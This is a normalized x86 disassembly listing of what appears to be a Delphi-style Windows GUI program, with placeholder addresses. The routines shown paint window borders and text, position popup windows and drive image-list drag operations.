call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424244
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_43fdc4
call sub_43fea4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_43fdc4
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_4404bc
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_454f1c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406a9c
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_44d178
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_451708
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_44e7e8
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_44f9ac
sub_454f88
push ebx
push esi
mov esi edx
call sub_464dc0
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406a38
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44e7e8
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406a38
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44e7e8
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_454fec
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_451ad0
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_455024
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_45501c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_455064
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44c734
mov dl 0x1
mov eax [ r-xdata ]
call sub_424360
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_44c210
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_4550c0
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44c80c
test bl bl
jle r-xdata
xor eax eax
call sub_44a804
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_455100
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_4246ac
xor eax eax
push ebp
push sub_45519b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_424af0
xor eax eax
push ebp
push sub_455178
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45517f
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_424af0
retn
sub_4551ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_455ae4
mov edx 0x80ffff
mov eax esi
call sub_44d7d4
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_424990
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_42432c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_455218
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_450ca8
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40bf3c
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_450c40
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_455284
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4552da
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4552e1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call ReleaseDC
retn
sub_4552e8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_455381
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_423a44
mov eax ebx
call sub_44f954
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_44d634
mov eax [ ebp - 0x14 ]
call sub_4043ac
push eax
mov eax [ ebx + 0x208 ]
call sub_424a70
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455388
lea eax [ ebp - 0x14 ]
call sub_403eec
retn
sub_455390
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_4553fc
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_455487
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45548e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f10
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44d634
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_4248d0
mov edx eax
add edx 0x6
mov eax esi
call sub_44cdf0
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_44d634
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_4248ec
mov edx eax
add edx 0x4
mov eax esi
call sub_44ce14
sub_455494
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_45566d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d664
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_44e88c
mov eax [ esi ]
call sub_46b6f0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_46b6fc
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_46b6f0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_46b6e4
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_46b6fc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_46b6d8
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_46b6e4
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_46b6d8
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_451550
push 0x4
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455674
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_4041ac
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_45872c
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call [ rw-data ]
sub_45567c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4556a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_416c50
mov eax esi
call sub_44f954
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4043ac
push eax
mov eax [ esi + 0x208 ]
call sub_424a70
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_455700
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_416c50
call sub_43fdc4
call sub_43fea4
test al al
jne r-xdata
call sub_43fdc4
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_440130
push esp
push 0x1
push 0xf
push 0x0
call sub_43fdc4
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_43ff14
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_45576c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_451e58
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_455790
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4557e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4558a8
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46bbc4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_429830
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46bbc4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_429830
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_4558b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a7c8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_45a904
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_455914
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45b234
mov eax ebx
call sub_45a7c8
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_455940
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_45a7c8
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_4557e8
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_4559a0
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_4558b4
push 0x0
call ShowCursor
sub_4559a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_45a7c8
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_455a04
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_455790
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_455a04
push ebx
mov ebx eax
mov eax ebx
call sub_45a7c8
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_455a28
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a7c8
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_455790
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_455a9c
push ebx
push esi
mov esi eax
mov eax esi
call sub_45a7c8
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_455a04
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_4558fc
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_455ae4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44fb48
mov dl 0x1
mov eax [ r-xdata ]
call sub_424360
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_44c210
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_455b40
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44fc6c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_455b90
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4246ac
xor eax eax
push ebp
push sub_455c2e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_424af0
xor eax eax
push ebp
push sub_455c0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44c228
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455c12
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_424af0
retn
sub_455c40
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_455cd4
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_455c5c
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_455cd4
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_4562cc
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_455cd4
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_455d08
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_455d98
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
mov edx 0x2
call sub_455d98
jmp r-xdata
retn
sub_455d50
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_455e04
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
mov edx 0x2
call sub_455e04
jmp r-xdata
retn
sub_455d98
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_4561cc
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_455e04
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_455cb8
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_4561cc
push eax
mov eax esi
call sub_455d08
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_4561cc
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_455eb4
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_455cb8
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_4562cc
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_455e04
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_455cb8
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_455e04
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_455d08
mov edx eax
add edx esi
mov eax ebx
call sub_4561f4
mov edx edi
mov eax ebx
call sub_4561f4
jmp r-xdata
mov eax ebx
call sub_456054
mov eax ebx
call sub_4562a4
mov ebx eax
test ebx ebx
jne r-xdata
sub_455f5c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403eec
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403f40
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
